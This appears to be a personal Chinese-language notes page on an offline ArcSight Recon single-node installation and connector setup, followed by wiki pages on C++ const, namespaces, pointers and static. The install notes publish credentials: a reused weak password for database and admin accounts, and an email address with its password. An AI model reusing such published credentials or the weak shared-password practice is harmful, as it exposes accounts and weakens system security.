在后续步骤使用arcsight-install命令的preinstall参数时，它会检查并尝试自动安装缺失的操作系统包依赖项。如果虚拟机能上网，它就能成功安装缺失的依赖项。如果虚拟机不能上网，它尝试连接逐个镜像源，但因为不能联网，都会失败，导致一些包没有被安装或更新，就会导致后续步骤无法继续进行。所以，我们要早早自行将这些包安装好。 1yum install conntrack-tools container-selinux curl device-mapper-libs httpd-tools java-1.8.0-openjdk libgcrypt libseccomp libtool-libs libtool-ltdl lvm2 net-tools nfs-utils rpcbind socat systemd-libs unzip bind-utils tar tips:我试了离线包安装的方式，没试好，如果你有时间可以尝试用离线包的方式进行安装。 我是这样做的：在一台可上网的VM中安装centos，然后执行上述命令，关机，导出ovf，再导入到不能联网的VMware中使用。 搭建本地yum源 安装原因： 在后续步骤使用arcsight-install命令的precheck参数时，它会检查虚拟机的一些配置，如果配置不对，则不通过。在断网环境中，precheck对yum配置检查这一项有概率不通过，会提示使用yum clean all和yum update，但此时虚拟机无法上网，无法完成yum clean all和yum update命令。所以我们通过搭建本地yum源的方式来解决不通过的这一项。 上传CentOS-7-x86_64-DVD-2009.iso文件到虚拟机中的/mnt/目录下 挂载ISO镜像到/mnt/yum目录下 1mkdir yum 1mount -t iso9660 /mnt/CentOS-7-x86_64-DVD-2009.iso /mnt/yum/ 回显类似如下是挂载成功： 1mount: /dev/loop0 is write-protected, mounting read-only 备份本地repo文件 12mkdir /opt/centos-yum.bakmv /etc/yum.repos.d/* /opt/centos-yum.bak/ 创建自己的repo文件 12cd /etc/yum.repos.d/vi /etc/yum.repos.d/local.repo 文件local.repo内容为： 123456[local]name=localbaseurl=file:///mnt/yum/ #本地yum源目录位置# enabled=1 #enabled=0配置项，表示不生效gpgcheck=1 gepkey=file:///mnt/yum/RPM-GPG-KEY-CentOS-7\t#本地yum源目录位置下GPG公钥 刷新yum缓存 清除缓存 1yum clean all 把yum源缓存到本地 1yum makecache 主机名、关闭ipv6、设置静态ip、DNS 主机名 1vim /etc/hostname 将文件内容修改为： 1cdf6.arcsight-test.com 执行如下命令生效： 1hostnamectl status 关闭ipv6地址 vim /etc/sysctl.conf 文件中加入一行： 1net.ipv6.conf.all.disable_ipv6 = 1 随后执行 1sysctl -p /etc/sysctl.conf 检验：ifconfig 查看ipv6已去掉 静态IP 1vi /etc/sysconfig/network-scripts/ifcfg-ens33 网卡可能不同，则后面的ifcfg-xxxx就不同 修改为： 12345678910111213141516171819TYPE=&quot;Ethernet&quot;PROXY_METHOD=&quot;none&quot;BROWSER_ONLY=&quot;no&quot;+BOOTPROTO=&quot;static&quot;DEFROUTE=&quot;yes&quot;IPV4_FAILURE_FATAL=&quot;no&quot;IPV6INIT=&quot;yes&quot;IPV6_AUTOCONF=&quot;yes&quot;IPV6_DEFROUTE=&quot;yes&quot;IPV6_FAILURE_FATAL=&quot;no&quot;IPV6_ADDR_GEN_MODE=&quot;stable-privacy&quot;NAME=&quot;ens33&quot;UUID=&quot;15ea7cf0-782d-44b1-ad10-630abf731345&quot;DEVICE=&quot;ens33&quot;ONBOOT=&quot;yes&quot;+IPADDR=&quot;192.168.147.136&quot;+NETMASK=&quot;255.255.255.0&quot;+GATEWAY=&quot;192.168.147.2&quot;+DNS1=&quot;192.168.147.135&quot; 随后重启网卡： 1service network restart 检验： 确保nslookup cdf6.arcsight-test.com解析出的是自己的ip地址 确保dig cdf6.arcsight-test.com解析出的是自己的ip地址，DNS服务器是自己设置的 chrony客户端配置 1vi /etc/chrony.conf 注释掉4个外部时钟，添加192.168.147.201作为时钟 123456789101112131415161718192021222324252627282930313233343536373839# Use public servers from the pool.ntp.org project.# Please consider joining the pool (http://www.pool.ntp.org/join.html).+ #server 0.centos.pool.ntp.org iburst+ #server 1.centos.pool.ntp.org iburst+ #server 2.centos.pool.ntp.org iburst+ #server 3.centos.pool.ntp.org iburst+ server 192.168.147.201 iburst# Record the rate at which the system clock gains/losses time.driftfile /var/lib/chrony/drift# Allow the system clock to be stepped in the first three updates# if its offset is larger than 1 second.makestep 1.0 3# Enable kernel synchronization of the real-time clock (RTC).rtcsync# Enable hardware timestamping on all interfaces that support it.#hwtimestamp *# Increase the minimum number of selectable sources required to adjust# the system clock.#minsources 2# Allow NTP client access from local network.#allow 192.168.0.0/16# Serve time even if not synchronized to a time source.#local stratum 10# Specify file containing keys for NTP authentication.#keyfile /etc/chrony.keys# Specify directory for log files.logdir /var/log/chrony# Select which information is logged.#log measurements statistics trackin 如果虚拟机能联网，可配置公网上的时钟。 重启chrony 1systemctl restart chronyd.service 使用以下命令查看同步状态，其中“^*” 代表时间已经正确同步 1chronyc sources -v 刚配置完重启后，有时chronyc sources -v看同步状态，没那么快变*号。可以等一会，如果过了比较长时间用chronyc sources -v还是没看到星号，可以回退快照重来。 相关安装文件准备（6个） 将以下6个文件放入/opt/arcsight文件夹中： 开始安装 在/opt/arcsight下解压 1[root@cdf6 arcsight ]# unzip arcsight-platform-installer-21.1.0.9.zip 放相关文件 12[root@cdf6 arcsight ]# mv arcsight-installer-metadata-21.1.0.9.tar arcsight-platform-installer-21.1.0.9/metadata/[root@cdf6 arcsight ]# mv *.tar arcsight-platform-installer-21.1.0.9/images/ 修改yaml文件中所有hostname字段为本主机的域名cdf6.arcsight-test.com，完整内容如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081# ArcSight Recon single node installation configuration## This example configures all components required by Recon to be installed on a single node including Fusion, Transformation Hub, and Database.## Before using this example, you must do the following:# - Replace the hostname &quot;yourdomain-node.yourenterprise.net&quot; (same value in multiple locations) with the correct values for your environment.# - Set the values of arcmc-generator-id-start and arcmc-generator-id-end to form a valid Generator ID Range# Generator ID Range: set a valid range within [1-16383]. # The difference between the values must be more than 100.## Key aspects of this configuration are:# - Encryption: yes# - Transformation Hub TLS Client Auth: yes# - FIPS 140 mode: yes# - High Availability: no, since it is deployed on a single node#cluster: default-node-size: small allow-worker-on-master: true enable-fips: false k8s-home: /opt/arcsight/kubernetes # master-api-ssl-port: 7443 master-nodes: - hostname: cdf6.arcsight-test.com username: root labels: [zk, kafka, th-processing, th-platform, fusion]suite: products: [transformationhub, fusion, recon] config-params: # Transformation Hub, defaults are commented th-init-fips: false # th-init-noOfTopicPartitions: 6 # The ArcSight Platform Installer automatically sets th-arcsight-avro, mf-event-avro-enriched, and th-cef topic partition count to Number of Database Nodes * 24. Other topics use this parameter. # th-init-kafkaRetentionBytesForVertica: When the database is colocated with the Kubernetes cluster, the ArcSight Platform Installer automatically calculates this value. # th-init-kafkaRetentionBytes: When the database is colocated with the Kubernetes cluster, the ArcSight Platform Installer automatically calculates this value. th-schema-registry-count: 1 transform-processor-replicas: 2 # enrichment-processor1-replicas: 2 # th-enrichment-processor-integrity-enabled: false routing-processor1-replicas: 0 th-kafka-count: 1 th-zookeeper-count: 1 th-init-kafkaOffsetsTopicReplicationFactor: 1 th-init-topicReplicationFactor: 1 th-kafka-allow-plaintext: true th-init-client-auth: false # th-schema-registry-min-kafka-count: 1 # Fusion # Generator ID parameters are mandatory parameters. # Ensure that you set arcmc-generator-id-enable to true. arcmc-generator-id-start: 1 arcmc-generator-id-end: 101 arcmc-generator-id-enable: truenfs: node: hostname: cdf6.arcsight-test.com username: root type: new root-folder: /opt/arcsight-nfs uid: 1999 gid: 1999database: db-installer-dir: /opt/arcsight-db-tools type: new ssl-enabled: false ssl-client-auth-enabled: false db-admin: dbadmin app-admin: appadmin search-user: search shard-count: 3 data-dir: /opt/vertica/data depot-dir: /opt/vertica/depot nodes: - hostname: cdf6.arcsight-test.com username: root hardware: cpu: 4 memory: 16 disk: 50 cd /opt/arcsight/arcsight-platform-installer-21.1.0.9 1./arcsight-install --config /opt/arcsight/recon-single-node.yaml --cmd precheck Troubleshooting： 不能联网的虚拟机，yum configuration那一项有概率报错。解决办法：安装本地yum源 https://www.freebuf.com/sectool/271726.html 1./arcsight-install --config /opt/arcsight/recon-single-node.yaml --cmd preinstall NFS那里会有5个Unable，不用理会 Troubleshooting： precheck这一步在会检查并尝试自动安装缺失的操作系统包依赖项，如果虚拟机不能上网，会安装失败。但还是黑色字体，不会那么显眼。如果继续下一步，会报关于依赖项的错。 解决办法：自行提前把相关的包yum install了。（《as-admin-guide.pdf》-P80） 1./arcsight-install --config /opt/arcsight/recon-single-node.yaml --cmd install 接受条约，输入y； 会让设置一堆关于数据库的密码、cdf的密码，可以统一设为Admin@123； 随后会从Step 1一直自动安装到Step几？记不清了 在有的Step中会问是否接受某某license，输入y； 在Step11（？）中会问是否跳过这些warnings，输入y； Troubleshooting： 经常会卡在Step11这一步，如果没询问是否跳过这些warnings，反而停止了。看输出，除了warnings还有FAILED项，根据它的输出看哪一些FAILED，然后回退到preinstall完成的快照，解决完FAILED，再重新install。 因为install后数据库已经安装了，如果有了FAILED项，解决完重新执行install，会提示数据库已存在，要先卸载数据库。这样比较麻烦。所以，先记住哪些项FAILED了，然后回退快照，处理完，再install。 等待安装完成，估计20min~2小时左右，看机器性能。如果卡住一个地方时间太长，可能是因为机器临时卡死。做法一：等待，等待，等待。做法二：回到preinstall的步骤接着走。 访问https://cdf6.arcsight-test.com:5443 -&gt;deployment -&gt;reconfigure -&gt; 修改一处3为1(broker的最小运行数量) 账号：admin 密码：Admin@123 账号密码是在之前的步骤执行./arcsight-install --config /opt/arcsight/recon-single-node.yaml --cmd install这条命令时设置的cdf密码 等待一会，使用kubectl get pods -A命令确保所有pods处于Completed或Running状态后进行postinstall 1kubectl get pods -A|grep -v &quot;Running&quot; 1./arcsight-install --config /opt/arcsight/recon-single-node.yaml --cmd postinstall Arcishgt服务端快照拍摄说明 从上述安装Arcsight的总体流程来看，搭建步骤为： 搭建DNS服务器 搭建chrony服务器配置（opt） Arcsight recon服务端搭建： 联网虚机：主机名、关闭ipv6、设置静态ip、DNS；chrony客户端配置；相关安装文件准备； 断网虚机：主机名、关闭ipv6、设置静态ip、DNS；chrony客户端配置；相关安装文件准备； 随后执行4条命令precheck、preinstall、install、postinstall 12./arcsight-install --config /opt/arcsight/recon-single-node.yaml --cmdprecheck 12./arcsight-install --config /opt/arcsight/recon-single-node.yaml --cmdpreinstall 1./arcsight-install --config /opt/arcsight/recon-single-node.yaml --cmd install 12./arcsight-install --config /opt/arcsight/recon-single-node.yaml --cmdpostinstall percheck执行完后是可以拍快照，然后未来恢复到该快照； preinstall执行完后是可以拍快照，然后未来恢复到该快照； 而如果已经执行了install，因为pods已提起来了，此时挂起或关机，再次打开环境会崩，只能对容器进行调试，或者重装。 正确步骤： 只要pods已经运行起来了，就要在/opt/arcsight/kubernetes/bin下使用kube-stop.sh脚本进行暂停，暂停完成后可以拍快照or挂起虚拟机。 挂起虚拟机拍快照，再恢复，也不行 12cd /opt/arcsight/kubernetes/bin./kube-stop.sh 上述sh，会自动暂停相关pods？（我说法可能不准确，因为我也不太懂） 恢复命令 1./kube-start.sh 需等待至使用kubectl get pods -A命令确保所有pods处于Completed或Running状态， 再执行 1./kube-status.sh 直至结尾显示“Full CDF is Running”，如下图所示 Windows客户端搭建指南 文件清单 文件名 MD5 ArcSight-8.2.0.8451.0-TrialConnector-Win64.exe dde8f122de58583fdd96499f7d28e7e8 演示例子中的域名、IP与服务端安装中不同，因为笔记是在多次环境安装中做的； 在实际安装过程中要对应好 以Win 10为例，进行以下步骤： 配置DNS 确保能解析域名cdf6.arcsight-test.com 双击安装包开始安装 默认点击OK；安装路径可保持默认或自选；在桌面创建图标 输入数字（1~16383）作为唯一ID，其他栏不用填 选择安装的采集器类型，并允许防火墙允许该应用的部分功能 被动采集器以安装Syslog NG Daemon为例，在此处选择Syslog NG Daemon 开放UDP1999端口监听日志（端口和协议可更改) 选择要收集的日志信息，默认即可 将采集器收集的数据发送到&quot;Transformation hub&quot; tips：如果是快速检验，可以选择不发送到服务端，选择CSV File选项生成csv文件保存在本地，指定保存的路径 目的参数填写如下图所示 将Arcsight服务器下的/opt/arcsight-db-tools/cert/issue_ca.crt，和Arcsight客户端/$安装目录$/ArcSightConnectors/current/jre/lib/security/cacerts，复制到同一个文件夹中（自己创建的)，使用keytool工具将证书添加到密钥库中 1keytool -import -alias connector -keystore &quot;E:\\certstemp\\cacerts&quot; -file issue_ca.crt 密钥库口令为changeit 是 将信任后的cacerts证书替换Arcsight客户端的/$安装目录$/ArcSightConnectors/current/jre/lib/security/cacerts，并将证书目录输入到SSL/TLS Truststore File Path一栏 注意要使用\\ 点击Next按钮，如果没有提示错误，即参数正确 connector details，Name随便填一个即可，其他选填 选择以服务或者独立程序的形式进行安装，这里以独立的程序为例 这一步选择Exit退出即可 至此，客户端安装完成。 Linux客户端搭建指南（不成功） 以Ubuntu20.04为例，需要进行以下步骤： 配置DNS 12sudo apt install resolvconfsudo systemctl enable --now resolvconf.service sudo vi /etc/resolvconf/resolv.conf.d/head 12nameserver 192.168.147.135nameserver 192.168.147.2 sudo resolvconf -u 检验： 确保nslookup cdf6.arcsight-test.com能正确解析出相应ip地址 确保dig cdf6.arcsight-test.com能解析相应ip地址，DNS服务器地址正确 以root用户安装 1./ArcSight-8.3.0.8658.0-TrialConnector-Linux64.bin 转发器类型选择：Apache HTTP Server Access Multiple FolderFile 前提：已安装apache2 sudo apt update sudo apt install apache2 sudo systemctl status apache2确保Apache正在运行 后续和Windows安装转发器一致 Linux客户端搭建指南（本地csv版） 挑选的以apache为事件作为例子。需要提前安装：apache2、curl sudo apt update sudo apt install apache2 sudo systemctl status apache2确保Apache正在运行 以root用户安装 1./ArcSight-8.3.0.8658.0-TrialConnector-Linux64.bin 转发器类型选择：Apache HTTP Server Access Multiple FolderFile 选择上次CSV文件，选择保存在桌面 其余下一步，即可完成安装 客户端开启及后台搜索🔍 window平台 在C:\\Program Files\\ArcsightSmartConnectors\\current\\bin目录下以管理员权限打开cmd，执行命令 1arcsight.bat agents 启动ArcsightSmartConnectors Linux平台 在安装目录bin目录下以root打开shell，执行命令 1./arcsight agents Linux的监控事件Apache HTTP Server Access Multiple Folder File，且没有将数据转到Transformation Hub，而是生成桌面的CSV File。 使用curl 127.0.0.1访问apache网页，Arcsight采集器会采集到此事件。 使用chrome浏览器输入网址https://cdf6.arcsight-test.com，登录服务端管理页面 第一次登录，进入注册界面，可以填虚假的邮箱，但后面没法找回密码了。可以注册前拍一个快照，然后去注册，然后忘了密码就回退快照重新注册一个。 ​\t记录一下我之前注册的： ​\t账号为：hello0308@gmail.com ​\t密码为：Admin@123 在&quot;SEARCH&quot;页面即可开始搜索由客户端产生的日志信息 搜索语法：查询所有事件 1* 来源ip为192.168.147.134的事件： 1Any. ip = 192.168.147.134 Win Event日志： Syslog NG Daemon日志： 我配置的是UDP1999，使用syslog Sender往该端口发Message，可在server后台搜索到 注意事项 客户端产生行为后，服务端管理页面由于数据库从TH抓取日志频率的问题，不会马上搜索到相应日志。 解决方法：更改搜索条件（如搜索语法、时间等条件），多次进行搜索。 一般情况下，至少延迟5min即可搜索到。如果还是没有，可能是数据库的时间和采集客户端时间不一致导致的。 &quot;记录&quot;一些方便筛选日志字段： Agent Address Agent type Destination Username Database Receipt Time Normalized Event Time External ID Name 拓展 在线html说明手册： https://www.microfocus.com/documentation/arcsight/arcsight-platform-22.1/arcsight-admin-guide-22.1/#platform_intro/platform_about.htm?TocPath=Introducing%2520ArcSight%2520Platform%257C_____0 syslog区别 https://community.microfocus.com/cyberres/arcsight/f/arcsight-discussions/366594/syslog-daemon-and-syslog-ng https://serverfault.com/questions/692309/what-is-the-difference-between-syslog-rsyslog-and-syslog-ng 相关资源 arcsight官网https://www.microfocus.com/en-us/cyberres/secops/arcsight-esm 参考文档 ArcSight Recon 1.2 Documentation Administrator’s Guide to ArcSight Platform 21.1 社区论坛https://community.microfocus.com/cyberres/?_ga=2.33871585.1994462426.1684978627-1507916439.1684978627 Linux从配置本地yum源到局域网内yum源共享"},{"title":"Function arguments & return values","path":"/wiki/Thinking_in_C++/Function_arguments&return_values.html","content":"The use of const to specify function arguments and return values is another place where the concept of constants can be confusing. If you are passing objects by value, specifying const has no meaning to the client (it means that the passed argument cannot be modified inside the function). If you are returning an object of a user-defined type by value as a const, it means the returned value cannot be modified. If you are passing and returning addresses, const is a promise that the destination of the address will not be changed. Passing by const value 函数参数本身就是值传递，函数内部对该参数的修改不会改变传入的这个参数，再加const是没意义的，反而这个const会让caller感到疑惑。 1234void f1(const int i)&#123; i++; // Illegal -- compile-time error&#125; 这个const实际上对函数的creator是一个工具（表明在函数内部不会对传入的参数进行修改），对caller而言是没用的。所以建议写成如下形式：将const写到函数内部，而不是写在函数参数列表上 12345void f2(int ic)&#123; const int &amp;i = ic; i++; // Illegal -- compile-time error&#125; 好处： 保持了const的含义，函数里不会对传入参数进行修改 对caller而言做了hidden Returning by const value 常量 const原意是说这个函数的返回值不能被修改，但对于返回常量而言，没区别的，它本来就是常量，而不是变量，本来就不能被修改。反而加const会让这个函数的caller迷惑，建议去掉const 123456789101112//: C08:Constval.cpp// Returning consts by value// has no meaning for built-in typesint f3() &#123; return 1; &#125;const int f4() &#123; return 1; &#125;int main()&#123; const int j = f3(); // Works fine int k = f4(); // But this works fine too!&#125; ///:~ 变量/对象 如果函数返回一个变量/对象，加const表示说这个返回值不能被修改，推导出=&gt;这个返回值不能做lvalue(左值)，that is, it cannot be assigned to or otherwise modified。 mark： 临时对象总是const的 they’re automatically const 因为你没法操纵它们（变量名或其他方式），所以编译器就设定为const Passing and returning addresses 返回值是一个指针或引用，函数调用者就可能会修改这个返回值。此时加const，就能防止这样的事情发生。"},{"title":"Namespaces","path":"/wiki/Thinking_in_C++/Namespaces.html","content":"在C语言中，函数名、变量名等标识符名字不能相同，否则会导致命名冲突。C++引入了命名空间（Namespace）的概念，以避免这种冲突，它的解决方法就是将这些标识符分到不同的“小空间”中。 为什么需要命名空间？ 在大型项目中，可能有成百上千个函数和变量。如果所有这些都放在一个全局范围内，那么可能会出现标识符之间冲突的问题。例如， 小A和小B可能在各自开发时都写了两个名为helper的函数 同一开发者在不同的文件中写了两个名为helper的函数 在没有命名空间的情况下，编译器无法区分这两个同名的函数。 定义命名空间 使用关键字namespace后跟命名空间的名称和一对花括号来定义一个命名空间，右花括号的结尾不用跟分号。 123456789101112namespace MyNamespace &#123; // 变量 int value; // 函数 void myFunction() &#123; //... &#125; // 类 class&#123;&#125;;&#125; 命名空间别名 可以为命名空间设置一个别名，以便于简化较长的命名空间名称。 12345678910namespace MyNamespace &#123; void myFunction() &#123; // ... &#125;&#125;namespace MNS = MyNamespace; // 设置别名为MNS// 使用别名MNS::myFunction(); 嵌套的命名空间 一个命名空间可以定义在另一个命名空间内 1234567namespace Outer &#123; namespace Inner &#123; void innerFunction() &#123; //... &#125; &#125;&#125; 调用嵌套命名空间中的函数 1Outer::Inner::innerFunction(); 不连续的命名空间 可以在项目的不同部分扩展同一个命名空间，所有这些分散的部分在程序中被视为一个统一的命名空间。 同一个命名空间的定义可以分散在不同的头文件中，如header2.h中在为命名空间MyNamespace增加新的内容：myFunction2() 函数。 header1.h1234567namespace MyNamespace &#123; void myFunction() &#123; //... &#125;&#125; header2.h1234567namespace MyNamespace &#123; void myFunction2() &#123; //... &#125;&#125; 匿名命名空间 匿名命名空间是没有名称的命名空间，主要用于限制其成员的可见性只在当前文件内。通常用于只在单个文件中需要的实现细节，从而避免全局命名空间的污染。 12345namespace &#123; void privateFunction() &#123; // ... &#125;&#125; 使用命名空间 作用域运算符 使用作用域解析运算符::来指定特定命名空间中的元素 命名空间定义12345namespace MyNamespace &#123; void myFunction() &#123; //... &#125;&#125; 命名空间使用1MyNamespace::myFunction(); 前面没有跟命名空间名字表示用的是全局的命名空间 12345678910111213141516#include &lt;stdio.h&gt;namespace x &#123; void Print() &#123; printf(&quot;x::Print() called &quot;); &#125;&#125;void Print() &#123; printf(&quot;Print() called &quot;);&#125;int main() &#123; x::Print(); // 调用命名空间x中的Print函数 ::Print(); // 调用全局作用域中的Print函数&#125; 使用using指令 可以使用using声明来避免每次都需要键入命名空间名 使用using namespace声明整个命名空间： 12using namespace MyNamespace;myFunction(); // 直接调用，不需要前缀 使用 using 声明单个元素 12using MyNamespace::myFunction;myFunction(); // 直接调用，不需要前缀 标准命名空间 C++标准库的所有标识符都定义在一个名为 std 的命名空间中。例如，标准库中的输入输出流类和函数都位于 std 命名空间中。 12std::cout &lt;&lt; &quot;Hello, World!&quot;;std::vector&lt;int&gt; v;"},{"title":"Pointers","path":"/wiki/Thinking_in_C++/Pointers.html","content":"Pointers and const When using const with pointers, you have two options: const can be applied to what the pointer is pointing to, or the const can be applied to the address stored in the pointer itself. Pointer to const const specifier在*的左边，叫指向常量的指针，表示不能通过这个指针修改指向的数据。 其实有两个含义： 指向的数据是常量，你不能用这个指针来修改它（常量本身就不能被修改） 你不想通过这个指针来修改指向的数据 用2来记比较好，2可以推导出1。不能通过这个指针修改指向的值or指向的值本身就是常量，不能被修改 12 const int* u;//u is a pointer, which points to a const int no initialization is required 另一种写法123 int const* v;\t//v is an ordinary pointer to an int that happens to be const. //That is, the const has bound itself to the int again, and the effect is the same as the previous definition. 例 不能通过这个指针来修改它指向的值 可以改变这个指针它指向的地址 1234567const int originalValue = 10;const int newValue = 20;const int* ptr = &amp;originalValue; // ptr 指向 originalValueptr = &amp;newValue; // ptr 现在指向 newValue// *ptr = 30; // 错误：不能通过 ptr 修改它指向的值 const pointer const specifier在*的右边，这个指针是常量指针（Const Pointer），这个指针指向的地址不能改变，不能再指向别的内存。 123int d = 1;int* const w = &amp;d;//w is a pointer, which is const, that points to an int 需要an initial value，因为是常量指针，之后这个指针没法改变它的指向 例 这个指针不能改变它指向的地址 可以通过它修改它指向的值（如果它指向的值不是const的话） 1234567int value1 = 10;int value2 = 20;int* const ptr = &amp;value1; // ptr 是一个指向 value1 的常量指针// ptr = &amp;value2; // 错误：不能改变 ptr 指向的地址*ptr = 30; // 正确：通过 ptr 修改 value1 的值 const pointer to a const object Now neither the pointer nor the object can be changed. 123int d = 1;const int* const x = &amp;d; // (1)int const* const x2 = &amp;d; // (2) 不同的叫法 常量指针 (Constant Pointer) /指针常量 (Pointer Constant)，不是标准的C++术语。 常量指针 (Constant Pointer) ，和Pointer to const一回事 指针常量 (Pointer Constant)，和Const Pointer一回事 Top-level const（顶层const）：指针自身是常量。和常量指针（Const Pointer）是一回事。 Low-level const（底层const）：不能通过指针来修改它指向的数据。和指向常量的指针（Pointer to const）是一回事。 2.4.3.Top-Level const As we’ve seen, a pointer is an object that can point to a different object. As a result, we can talk independently about whether a pointer is const and whether the objects to which it can point are const. We use the term top-level const to indicate that the pointer itself is a const. When a pointer can point to a const object, we refer to that const as a low-level const.《C++ Primer 5th》 Character array literals howdy在常量区，实际上它是个const char*，虽然没加const编译能过，但使用指针x来修改这个字符串的字符运行时会报错，因为常量区只读不可写。 字符串指针12char *x = &quot;howdy&quot;;*(x + 1) = &#x27;A&#x27;; // 编译能通过，执行报错0xC0000005 abcde在堆栈，可读可写，用指针y来修改这个字符串是ok的。 字符串12char y[] = &quot;abcde&quot;;y[1] = &#x27;A&#x27;; // 编译能通过，也能执行 绕过编译器对const的检查 const是编译器在编译时做检查，运行时（Run time）用指针照样能去改，在代码中用强转来绕过这种限制，但这不是一个好的编程习惯 像使用指针指向一个对象，用指针来访问这个对象原意用private限制访问的成员 12345678//: C08:PointerAssignment.cppint d = 1;const int e = 2;int *u = &amp;d; // OK -- d not const//! int* v = &amp;e; // Illegal -- e constint *w = (int *)&amp;e; // Legal but bad practice"},{"title":"static","path":"/wiki/Thinking_in_C++/static.html","content":"In both C and C++ the keyword static has two basic meanings, which unfortunately often step on each other’s toes: Static storage Allocated once at a fixed address; that is, the object is created in a special static data area rather than on the stack each time a function is called. Visibility of a name Local to a particular translation unit (and local to a class scope in C++, as you will see later). Here, static controls the visibility of a name, so that name cannot be seen outside the translation unit or class. This also describes the concept of linkage, which determines what names the linker will see. 概念补充 存储位置 变量存放在哪，全局区，栈，堆。 堆：new出来的 全局区：函数地址，全局变量 栈：局部变量 生命周期 变量所在的内存从分配到释放的这段时间 作用域（Scoping） Scoping rules tell you where a variable is valid, where it is created, and where it gets destroyed (i.e., goes out of scope). The scope of a variable extends from the point where it is defined to the first closing brace that matches the closest opening brace before the variable was defined. That is, a scope is defined by its “nearest” set of braces. To illustrate: 123456789101112131415161718192021222324252627//: C03:Scope.cpp// How variables are scopedint main() &#123; int scp1; // scp1 visible here &#123; // scp1 still visible here //..... int scp2; // scp2 visible here //..... &#123; // scp1 &amp; scp2 still visible here //.. int scp3; // scp1, scp2 &amp; scp3 visible here // ... &#125; // &lt;-- scp3 destroyed here // scp3 not available here // scp1 &amp; scp2 still visible here // ... &#125; // &lt;-- scp2 destroyed here // scp3 &amp; scp2 not available here // scp1 still visible here //..&#125; // &lt;-- scp1 destroyed here///:~ The example above shows when variables are visible and when they are unavailable (that is, when they go out of scope). A variable can be used only when inside its scope. Scopes can be nested, indicated by matched pairs of braces inside other matched pairs of braces. Nesting means that you can access a variable in a scope that encloses the scope you are in. In the example above, the variable scp1 is available inside all of the other scopes, while scp3 is available only in the innermost scope. 连接(linkage) In an executing program, an identifier is represented by storage in memory that holds a variable or a compiled function body. Linkage describes this storage as it is seen by the linker. There are two types of linkage: internal linkage and external linkage. 内部链接（internal linkage） Internal linkage means that storage is created to represent the identifier only for the file being compiled. 内部链接意味着对象或函数只在定义它的编译单元内部可见。这意味着即使其他文件中有相同名称的变量或函数，它们也是不同的，各自在自己的编译单元中独立存在。 外部链接（External Linkage） External linkage means that a single piece of storage is created to represent the identifier for all files being compiled. The storage is created once, and the linker must resolve all other references to that storage. 外部链接意味着在多个编译单元中可以访问同一个对象或函数。 如果你在一个文件中声明了一个全局变量或函数，你可以在其他文件中访问它，只要你在那些文件中提供了适当的声明。例如，如果你在一个文件中定义了一个函数 void myFunction()，并且在另一个文件中声明了这个函数（通常通过包含一个头文件），那么你可以在第二个文件中调用 myFunction() 函数之外的所有变量（在C++中除了const）和函数定义默认为外部连接，也可以在定义时使用关键字extern显式指定标识符具有外部连接。但通常情况下我们都是省略了extern。 一般来说，在文件作用域（file scope）的name是external linkage，对所有编译单元可见，比如一个全局的变量和函数名，可以使用static关键字将一个全局的变量/函数改为内部链接（internal linkage）属性 extern extern主要用于两个方面：声明外部链接的变量或函数，和在某些情况下显式声明函数原型。显式声明函数原型上面提到过了。说下声明外部链接的变量或函数这个用途： The extern keyword has already been briefly described and demonstrated. It tells the compiler that a variable or a function exists, even if the compiler hasn’t yet seen it in the file currently being compiled. This variable or function may be defined in another file or further down in the current file. As an example of the latter: 123456789101112131415161718//: C03:Forward.cpp// Forward function &amp; data declarations#include &lt;iostream&gt;using namespace std;// This is not actually external, but the // compiler must be told it exists somewhere:extern int i; extern void func();int main() &#123; i = 0; func();&#125;int i; // The data definitionvoid func() &#123; i++; cout &lt;&lt; i;&#125; ///:~ When the compiler encounters the declaration ‘extern int i’, it knows that the definition for i must exist somewhere as a global variable. When the compiler reaches the definition of i, no other declaration is visible, so it knows it has found the same i declared earlier in the file. If you were to define i as static, you would be telling the compiler that i is defined globally (via the extern), but it also has file scope (via the static), so the compiler will generate an error. extern告诉编译器elsewhere会有这个变量i，于是编译就能通过，link时由链接器去找。 仅从visibility上对比，extren表示这个名字对所有translation units都可见，是static的opposite（visible only in this translation unit） 1234int a = 0;//等价写法extern int a = 0; 但如果是static，则表示a这个名字只在当前文件可见 1static int a = 0; static elements in C/C++ Static free functions 函数（非成员函数）VSstatic 函数（非成员函数） 函数名本身就是全局的 存储类型 全局 -&gt; 不变 全局 作用域 文件作用域 -&gt; 改变 当前文件 链接属性 外部链接 -&gt; 改变 内部链接 12345// external linkagevoid f();// 等价写法extern void f(); 加static就表明函数f()只在当前文件可见，有时称作文件静态（file static） 1static void f(); static local variables 局部变量（基本类型）VSstatic 局部变量（基本类型） 存储类型 栈 -&gt; 改变 全局 作用域 函数作用域 -&gt; 不变 函数作用域 初始化时机：函数第一次被调用 初始化的值：如果没有指定，则是0 Example: num_calls将在每次函数执行时候++123456void f()&#123; static int num_calls = 0; //... num_calls++;&#125; // 全局变量，但只能在函数里访问 局部变量（对象）VSstatic 局部变量（对象） 存储类型 栈 -&gt; 改变 全局 作用域 函数作用域 -&gt; 不变 函数作用域 初始化时机：函数第一次被调用，由构造函数进行初始化 初始化的值：看构造函数实现 Example g_global： File1中的g_global是个全局变量，对所有translation units可见，所以在File12中可以用extern int g_global来表明g_global定义在别处，然后就可以使用g_global1了。 s_local： static，只对当前文件可见。即使File2中用extern int s_local表明s_local定义在别处，编译能过，但link时过不去（File1说s_local只给自己这个文件用） hidden： static，函数名只对当前文件可见，File2不可见，不可使用 Confusion 通过上面的例子，可以发现，正因为static关键字可以表示两种含义（存储类型和可见性），所以会造成理解上的困扰。给全局变量加static，改的是链接属性；给局部变量加static，改的持久存储；给函数（非成员函数）加static，改的是链接属性。换个角度其实可以理解，加上static后，无法同时将两个含义都修改，加上static后变的只有一个含义，如： 全局变量，本身就是全局存储，加了static还是全局存储，所以加static就是限制可见性 局部变量，本身可见性是在函数作用域，加了static可见性还是在函数作用域里，所以加static就是修改为持久存储 函数（非成员），函数地址本身就是全局地址，加了static还是全局，所以加static就是限制可见性 核心点还是从static的两种基本含义存储类型和可见性方面进行分析。 静态对象的构造和析构调用顺序 Construction occurs when definition is encountered Constructor called at-most once 构造只发生一次，在函数第一次被调用时发生 The constructor arguments must be satisfied Destruction takes place on exit from program 析构在程序结束时发生 Compiler assures LIFO order of destructors 所有被创建的对象的析构函数按创建时相反的顺序被调用 